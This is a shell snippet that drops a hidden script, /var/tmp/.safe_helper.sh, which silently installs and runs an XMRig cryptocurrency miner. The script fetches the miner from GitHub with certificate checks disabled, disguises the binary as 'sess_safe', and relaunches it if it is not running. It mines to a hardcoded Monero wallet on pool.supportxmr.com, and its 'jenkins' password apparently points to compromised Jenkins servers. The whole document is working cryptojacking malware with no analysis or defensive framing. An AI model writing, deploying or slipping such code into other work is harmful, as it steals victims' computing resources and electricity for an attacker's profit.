cat <<'EOF' > /var/tmp/.safe_helper.sh
#!/bin/bash

# 自修复 XMRig 挖矿进程（兼容 wget/curl，支持代理和重试）

# 检查进程是否在运行
if pgrep -f "sess_safe.*pool.supportxmr.com" >/dev/null; then
    exit 0  # 已经在运行，退出
fi

# 如果二进制文件不存在，就下载
if [ ! -f "/var/tmp/sess_safe" ]; then
    echo "[*] Downloading XMRig..."

    # 定义下载函数（自动选择 wget 或 curl）
    download_xmrig() {
        local url="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
        
        # 尝试用 wget
        if command -v wget >/dev/null; then
            echo "[+] Using wget..."
            wget --no-check-certificate -qO- "$url" | tar -xz -C /var/tmp --strip-components=1 xmrig-6.22.2/xmrig
            return $?
        fi

        # 尝试用 curl
        if command -v curl >/dev/null; then
            echo "[+] Using curl..."
            curl -skL "$url" | tar -xz -C /var/tmp --strip-components=1 xmrig-6.22.2/xmrig
            return $?
        fi

        echo "[-] Error: Neither wget nor curl is available!"
        return 1
    }

    # 最多尝试 3 次下载
    for i in {1..3}; do
        if download_xmrig; then
            mv /var/tmp/xmrig /var/tmp/sess_safe
            chmod +x /var/tmp/sess_safe
            rm -rf /var/tmp/xmrig-6.22.2 2>/dev/null
            echo "[+] XMRig downloaded successfully."
            break
        else
            echo "[!] Download attempt $i failed. Retrying..."
            sleep 5
        fi
    done

    # 如果下载失败，退出
    if [ ! -f "/var/tmp/sess_safe" ]; then
        echo "[-] Failed to download XMRig after 3 attempts."
        exit 1
    fi
fi

# 启动 XMRig（静默运行）
echo "[*] Starting XMRig..."
nohup /var/tmp/sess_safe -o pool.supportxmr.com:3333 -u 43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE --cpu-max-threads-hint 60 -p jenkins -donate-level=0 -b >/dev/null 2>&1 &
EOF

chmod +x /var/tmp/.safe_helper.sh
